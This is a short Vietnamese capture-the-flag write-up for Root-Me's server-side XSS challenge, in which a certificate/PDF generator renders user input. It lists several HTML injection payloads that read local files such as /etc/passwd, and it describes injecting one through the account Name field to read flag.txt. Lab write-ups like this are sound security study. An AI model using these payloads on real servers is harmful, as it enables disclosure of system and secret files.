## Link challenge: [XSS - Server Side](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

Challenge này sẽ tạo cho user một chứng chỉ về một nội dung nào đó mà user cung cấp (chắc là có thể inject xss vào đây).

Để lấy được flag ta cần cat được file `flag.txt`. Tìm kiếm một số payload xss có thể sử dụng, tham khảo tại [HERE](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)

Ta thấy có một số payload hợp lí ở mục `Read local file`, thay tên file thành `/flag.txt':

```
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd"> 
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

Thử những payload ở trên và cả alert nhưng vẫn chẳng thu được kết quả nào!

![Imgur](https://i.imgur.com/lIb7DDB.png)
![Imgur](https://i.imgur.com/oOfy4Eb.png)

Nhưng còn 1 chỗ nữa ta chưa thử inject... đó là thông tin đăng nhập. Ta thử đăng kí xem điều gì sẽ xảy ra trong cert khi ta có tài khoản log in - THẤY: sẽ có thêm tên người tạo cert. Vậy đây cũng là một vùng text có thể inject. Thử chèn 1 ảnh vào Name khi đăng kí ta thấy đã có lỗi in ảnh hiện ra, có vẻ là đã có tác dụng.

![Imgur](https://i.imgur.com/4EJdkbV.png)

Nhanh trí sign up 1 tài khoản sao cho có thể inject được file `flag.txt`. DONE!

![Imgur](https://i.imgur.com/5DESjgn.png)